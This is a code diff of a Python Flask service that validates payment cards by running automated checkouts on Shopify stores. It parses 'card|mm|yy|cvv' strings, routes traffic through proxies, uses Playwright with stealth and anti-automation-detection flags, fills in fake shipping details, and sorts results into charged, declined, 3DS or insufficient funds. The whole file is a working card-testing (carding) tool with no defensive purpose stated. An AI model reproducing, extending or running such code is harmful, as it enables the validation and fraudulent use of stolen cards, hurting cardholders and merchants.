@@ -1,14 +1,25 @@
-from flask import Flask, request, jsonify
-import requests
-import re
-import logging
 import os
-from datetime import datetime
+import re
+import json
+import asyncio
+import logging
+from flask import Flask, request, jsonify
+from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
+from playwright_stealth import stealth_async  # optional: hides automation
 
+# ===== CONFIGURATION =====
+PORT = int(os.environ.get('PORT', 5000))
+HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
+TIMEOUT = int(os.environ.get('TIMEOUT', 30000))  # milliseconds per action
+USER_AGENT = os.environ.get('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+
+# ===== APP SETUP =====
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-def extract_cc(text):
+# ===== HELPERS =====
+def extract_cc(text: str):
+    """Extract card, month, year, cvv from 'card|mm|yy|cvv'."""
     pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
     match = re.search(pattern, text)
     if match:
@@ -18,182 +29,181 @@ def extract_cc(text):
         return card, month, year, cvv
     return None, None, None, None
 
-def get_product_and_variant(site, session, proxy_dict):
-    """Fetch a product and its first available variant using multiple methods."""
-    # Method 1: products.json
-    try:
-        url = f"{site}/products.json?limit=1"
-        resp = session.get(url, proxies=proxy_dict, timeout=15)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('products'):
-                product = data['products'][0]
-                product_id = product['id']
-                variants = product.get('variants', [])
-                if variants:
-                    for v in variants:
-                        if v.get('available', True):
-                            return product_id, v['id']
-                    return product_id, variants[0]['id']
-    except:
-        pass
-
-    # Method 2: collections/all/products.json
-    try:
-        url = f"{site}/collections/all/products.json?limit=1"
-        resp = session.get(url, proxies=proxy_dict, timeout=15)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('products'):
-                product = data['products'][0]
-                product_id = product['id']
-                variants = product.get('variants', [])
-                if variants:
-                    for v in variants:
-                        if v.get('available', True):
-                            return product_id, v['id']
-                    return product_id, variants[0]['id']
-    except:
-        pass
-
-    # Method 3: try common product IDs (1 to 20)
-    for pid in range(1, 21):
-        try:
-            url = f"{site}/products/{pid}.json"
-            resp = session.get(url, proxies=proxy_dict, timeout=10)
-            if resp.status_code == 200:
-                data = resp.json()
-                if data.get('product'):
-                    product = data['product']
-                    product_id = product['id']
-                    variants = product.get('variants', [])
-                    if variants:
-                        for v in variants:
-                            if v.get('available', True):
-                                return product_id, v['id']
-                        return product_id, variants[0]['id']
-        except:
-            pass
-
-    # Method 4: try to get product from cart (if items exist)
-    try:
-        url = f"{site}/cart.js"
-        resp = session.get(url, proxies=proxy_dict, timeout=15)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('items'):
-                item = data['items'][0]
-                return item.get('product_id'), item.get('variant_id')
-    except:
-        pass
-
-    return None, None
-
-def add_to_cart(site, session, variant_id, proxy_dict):
-    try:
-        url = f"{site}/cart/add.js"
-        payload = {'id': variant_id, 'quantity': 1}
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+def build_proxy_config(proxy_string: str):
+    """Convert proxy string to Playwright proxy dict."""
+    if not proxy_string:
+        return None
+    parts = proxy_string.split(':')
+    if len(parts) == 2:  # ip:port
+        return {"server": f"http://{proxy_string}"}
+    elif len(parts) == 4:  # ip:port:user:pass
+        ip, port, user, password = parts
+        return {
+            "server": f"http://{ip}:{port}",
+            "username": user,
+            "password": password
         }
-        resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=20)
-        return resp.status_code == 200
-    except:
-        return False
+    return None
 
-def process_payment(site, session, card, month, year, cvv, proxy_dict):
-    checkout_url = f"{site}/checkout"
-    try:
-        resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
-        if resp.status_code != 200:
-            return {"status": "error", "message": f"Checkout page failed (HTTP {resp.status_code})", "price": 0}
-        html = resp.text
-        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
-        token = token_match.group(1) if token_match else None
-    except Exception as e:
-        return {"status": "error", "message": f"Failed to load checkout: {str(e)}", "price": 0}
+def is_cloudflare_page(content: str, url: str) -> bool:
+    """Check if page is behind Cloudflare challenge."""
+    lower = content.lower()
+    return any(x in lower for x in ['cf-browser-verification', 'cf-challenge', 'cloudflare']) or '/cdn-cgi/' in url
 
-    payload = {
-        'authenticity_token': token or '',
-        'checkout[credit_card][number]': card,
-        'checkout[credit_card][month]': month,
-        'checkout[credit_card][year]': year,
-        'checkout[credit_card][verification_value]': cvv,
-        'checkout[payment_gateway]': 'shopify_payments',
-        'checkout[accepts_terms]': '1',
-        'checkout[shipping_address][first_name]': 'John',
-        'checkout[shipping_address][last_name]': 'Doe',
-        'checkout[shipping_address][address1]': '123 Main St',
-        'checkout[shipping_address][city]': 'New York',
-        'checkout[shipping_address][province]': 'NY',
-        'checkout[shipping_address][zip]': '10001',
-        'checkout[shipping_address][country]': 'US',
-        'checkout[shipping_address][phone]': '1234567890',
-        'checkout[email]': 'test@example.com',
-    }
+def is_3ds_page(content: str) -> bool:
+    """Check if page indicates 3DS/challenge."""
+    lower = content.lower()
+    return any(x in lower for x in ['3d secure', '3ds', 'authenticate', 'verification required', 'challenge required'])
 
-    headers = {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Referer': f"{site}/checkout"
-    }
+def parse_shopify_error(content: str) -> str:
+    """Extract error message from Shopify checkout page."""
+    # Common Shopify error containers
+    patterns = [
+        r'<p[^>]*class="error"[^>]*>(.*?)</p>',
+        r'<div[^>]*class="field__message--error"[^>]*>(.*?)</div>',
+        r'<li[^>]*class="error"[^>]*>(.*?)</li>',
+        r'<span[^>]*class="error"[^>]*>(.*?)</span>'
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
+        if match:
+            error_text = re.sub(r'<[^>]+>', '', match.group(1)).strip()
+            if error_text:
+                return error_text
+    return None
 
-    try:
-        payment_url = f"{site}/checkout/payment"
-        if token:
-            payment_url = f"{site}/checkout/{token}/payment"
+# ===== CORE CHECKOUT LOGIC (ASYNCIO) =====
+async def perform_checkout(site_url: str, card: str, month: str, year: str, cvv: str, proxy_string: str = None):
+    """
+    Perform Shopify checkout using Playwright.
+    Returns a dict with 'Response', 'Price', 'Gateway'.
+    """
+    proxy_config = build_proxy_config(proxy_string)
+    async with async_playwright() as p:
+        # Launch browser with anti-detection arguments
+        browser = await p.chromium.launch(
+            headless=HEADLESS,
+            args=[
+                '--disable-blink-features=AutomationControlled',
+                '--disable-features=IsolateOrigins,site-per-process',
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-web-security',
+                '--disable-gpu'
+            ]
+        )
+        # Create context with proxy and user agent
+        context = await browser.new_context(
+            proxy=proxy_config,
+            user_agent=USER_AGENT,
+            viewport={'width': 1280, 'height': 800}
+        )
+        page = await context.new_page()
 
-        resp = session.post(payment_url, data=payload, headers=headers, proxies=proxy_dict, timeout=30)
+        # Apply stealth (optional)
+        try:
+            await stealth_async(page)
+        except ImportError:
+            pass  # stealth not installed, skip
 
-        if resp.status_code == 200:
-            html = resp.text.lower()
-            if 'order placed' in html or 'thank you' in html:
-                price_match = re.search(r'total_price["\']?\s*[:=]\s*["\']?([\d.]+)', resp.text)
-                price = float(price_match.group(1)) if price_match else 0.0
-                return {"status": "charged", "message": "Order placed successfully", "price": price}
-            elif '3ds' in html or '3d secure' in html:
-                return {"status": "3ds", "message": "3DS_REQUIRED", "price": 0}
-            else:
-                error_match = re.search(r'<p class="error">(.*?)</p>', resp.text, re.DOTALL)
-                if error_match:
-                    return {"status": "declined", "message": error_match.group(1).strip(), "price": 0}
-                return {"status": "declined", "message": "CARD_DECLINED", "price": 0}
-        else:
-            return {"status": "error", "message": f"Payment HTTP {resp.status_code}", "price": 0}
-    except Exception as e:
-        return {"status": "error", "message": str(e), "price": 0}
+        # Step 1: Go to the store homepage to set cookies & session
+        try:
+            await page.goto(site_url, timeout=TIMEOUT, wait_until='domcontentloaded')
+        except Exception as e:
+            await browser.close()
+            return {"Response": f"Failed to reach store: {str(e)[:80]}", "Price": 0, "Gateway": "Shopify Payments"}
 
-def checkout_shopify(site, card, month, year, cvv, proxy=None):
-    session = requests.Session()
-    proxy_dict = None
-    if proxy:
-        parts = proxy.split(':')
-        if len(parts) == 4:
-            ip, port, user, password = parts
-            proxy_dict = {'http': f'http://{user}:{password}@{ip}:{port}', 'https': f'https://{user}:{password}@{ip}:{port}'}
-        elif len(parts) == 2:
-            ip, port = parts
-            proxy_dict = {'http': f'http://{ip}:{port}', 'https': f'https://{ip}:{port}'}
+        # Step 2: Go to /checkout
+        try:
+            await page.goto(f"{site_url}/checkout", timeout=TIMEOUT, wait_until='networkidle')
+        except Exception as e:
+            await browser.close()
+            return {"Response": f"Failed to reach checkout: {str(e)[:80]}", "Price": 0, "Gateway": "Shopify Payments"}
 
-    product_id, variant_id = get_product_and_variant(site, session, proxy_dict)
-    if not product_id or not variant_id:
-        return {"Response": "No product or variant found on this store", "Price": 0, "Gateway": "Shopify Payments"}
+        # Check for Cloudflare after navigation
+        content = await page.content()
+        if is_cloudflare_page(content, page.url):
+            await browser.close()
+            return {"Response": "Cloudflare challenge detected", "Price": 0, "Gateway": "Shopify Payments"}
 
-    if not add_to_cart(site, session, variant_id, proxy_dict):
-        return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}
+        # Step 3: Fill card details and submit
+        try:
+            # Wait for card number field – use common selectors
+            card_selector = 'input[name="checkout[credit_card][number]"], input#credit_card_number, input[data-credit-card-field="number"]'
+            await page.wait_for_selector(card_selector, timeout=TIMEOUT)
+            
+            # Fill card number
+            await page.fill(card_selector, card)
+            
+            # Fill cardholder name (if present)
+            name_selector = 'input[name="checkout[credit_card][name]"], input#credit_card_name'
+            if await page.locator(name_selector).count() > 0:
+                await page.fill(name_selector, "John Doe")
 
-    result = process_payment(site, session, card, month, year, cvv, proxy_dict)
+            # Fill expiry month/year
+            month_selector = 'input[name="checkout[credit_card][month]"], input#credit_card_month'
+            year_selector = 'input[name="checkout[credit_card][year]"], input#credit_card_year'
+            await page.fill(month_selector, month)
+            await page.fill(year_selector, year)
 
-    if result['status'] == 'charged':
-        return {"Response": result['message'], "Price": result['price'], "Gateway": "Shopify Payments"}
-    elif result['status'] == '3ds':
-        return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify Payments"}
-    elif result['status'] == 'declined':
-        return {"Response": result['message'], "Price": 0, "Gateway": "Shopify Payments"}
-    else:
-        return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}
+            # Fill CVV
+            cvv_selector = 'input[name="checkout[credit_card][verification_value]"], input#credit_card_verification_value'
+            await page.fill(cvv_selector, cvv)
 
+            # Click the "Pay now" or "Complete order" button
+            pay_button = 'button[type="submit"][name="button"], button:has-text("Pay"), button:has-text("Complete order"), button[data-testid="checkout-pay"]'
+            await page.click(pay_button, timeout=5000)
+
+            # Wait for the result (either success page or error)
+            # We'll wait up to 10 seconds for navigation or error
+            await page.wait_for_timeout(8000)
+
+        except PlaywrightTimeout as e:
+            await browser.close()
+            return {"Response": f"Timeout during payment form: {str(e)[:50]}", "Price": 0, "Gateway": "Shopify Payments"}
+        except Exception as e:
+            await browser.close()
+            return {"Response": f"Payment form error: {str(e)[:80]}", "Price": 0, "Gateway": "Shopify Payments"}
+
+        # Step 4: Analyze the final page
+        final_url = page.url
+        content = await page.content()
+        lower_content = content.lower()
+        await browser.close()
+
+        # Check for success (thank you / order placed)
+        if any(x in final_url.lower() for x in ['thank_you', 'order/']):
+            # Try to extract price from the page
+            price_match = re.search(r'<span[^>]*data-total-price[^>]*>([\d.]+)</span>', content)
+            price = float(price_match.group(1)) if price_match else 0.0
+            return {"Response": "Order placed successfully", "Price": price, "Gateway": "Shopify Payments"}
+
+        # Check for 3DS/challenge
+        if is_3ds_page(content):
+            return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify Payments"}
+
+        # Check for Shopify error messages
+        error_msg = parse_shopify_error(content)
+        if error_msg:
+            # Normalize some common errors for better classification
+            lower_err = error_msg.lower()
+            if 'cvv' in lower_err:
+                return {"Response": "Invalid CVV", "Price": 0, "Gateway": "Shopify Payments"}
+            if 'insufficient' in lower_err:
+                return {"Response": "Insufficient funds", "Price": 0, "Gateway": "Shopify Payments"}
+            if 'declined' in lower_err:
+                return {"Response": "Card declined", "Price": 0, "Gateway": "Shopify Payments"}
+            return {"Response": error_msg[:100], "Price": 0, "Gateway": "Shopify Payments"}
+
+        # Fallback: look for generic decline indicators
+        decline_keywords = ['declined', 'error', 'invalid', 'incorrect', 'not supported', 'expired']
+        if any(k in lower_content for k in decline_keywords):
+            return {"Response": "Card declined", "Price": 0, "Gateway": "Shopify Payments"}
+
+        # Unknown outcome – treat as dead
+        return {"Response": "Could not determine payment status", "Price": 0, "Gateway": "Shopify Payments"}
+
+# ===== FLASK ENDPOINTS =====
 @app.route('/shopify', methods=['GET'])
 def shopify_check():
     site = request.args.get('site')
@@ -210,17 +220,27 @@ def shopify_check():
     if not site.startswith('http'):
         site = 'https://' + site
 
+    # Run async function inside Flask
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     try:
-        result = checkout_shopify(site, card, month, year, cvv, proxy)
-        return jsonify(result)
+        result = loop.run_until_complete(perform_checkout(site, card, month, year, cvv, proxy))
     except Exception as e:
         app.logger.error(f"Unhandled exception: {e}")
-        return jsonify({"Response": f"ERROR: {str(e)}", "Price": 0, "Gateway": "Shopify Payments"}), 500
+        result = {"Response": f"ERROR: {str(e)[:80]}", "Price": 0, "Gateway": "Shopify Payments"}
+    finally:
+        loop.close()
 
-@app.route('/ping')
+    return jsonify(result)
+
+@app.route('/ping', methods=['GET'])
 def ping():
-    return jsonify({"status": "alive", "time": datetime.now().isoformat()})
+    return jsonify({"status": "alive"})
 
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({"status": "ok"})
+
+# ===== RUN =====
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=PORT, debug=False)
